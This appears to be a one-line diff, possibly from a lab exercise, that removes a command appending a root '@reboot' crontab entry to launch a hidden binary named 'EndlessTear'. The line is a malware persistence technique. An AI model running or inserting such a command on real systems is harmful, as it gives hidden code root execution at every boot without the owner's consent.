@@ -1,1 +1,0 @@
-sudo sh -c "echo @reboot root /home/victim/Downloads/task2/.EndlessTears/EndlessTear >> /etc/crontab"
